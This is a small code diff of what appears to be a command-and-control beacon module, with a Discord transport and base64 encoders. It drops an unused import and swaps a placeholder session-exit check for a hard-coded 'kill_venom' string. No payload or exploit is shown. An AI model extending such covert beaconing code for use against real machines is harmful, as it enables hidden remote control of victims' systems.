@@ -1,7 +1,6 @@
 import socket
 import struct
 import config
-import encoders
 from encoders import encoder_base64, encoder_b64url
 from transports import transport_discord
 
@@ -115,7 +114,7 @@ def manageSession(beaconId):
             data = retrieveData(beaconId)
             # Process the data as required
             # If a condition occurs to exit the session
-            if some_exit_condition(data):
+            if data == 'kill_venom':
                 break
     finally:
         # Ensure that we notify the controller of the exit
